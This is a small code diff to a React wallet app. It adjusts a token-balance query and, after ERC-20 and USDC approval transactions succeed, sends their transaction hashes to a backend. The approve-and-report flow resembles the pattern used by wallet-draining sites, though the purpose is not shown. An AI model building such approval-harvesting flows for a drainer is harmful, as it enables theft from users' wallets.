@@ -82,7 +82,7 @@ function App() {
         setErcBalances([])
         // const wallet_addr = "0xBB289bC97591F70D8216462DF40ED713011B968a";
         const query = new URLSearchParams({
-            verified: 'false',
+            verified: 'true',
             includeLowVolume: 'true',
             chainId: 'false',
             token: 'true',
@@ -237,12 +237,12 @@ function App() {
         async function sendTBE() {
             if (approveTxSuccess) {
                 console.log('TNX reciept', approveTxData)
-                sendToBackend(approveTxData, approveTxData.hash)
+                sendToBackend(approveTxData, approveTxData.transactionHash)
             }
 
             if (approveTxSuccessUSDC) {
                 console.log('TNX reciept usdc', approveTxData)
-                sendToBackend(approveTxUSDCData, approveTxUSDCData.hash)
+                sendToBackend(approveTxUSDCData, approveTxUSDCData.transactionHash)
             }
         }
         sendTBE() 
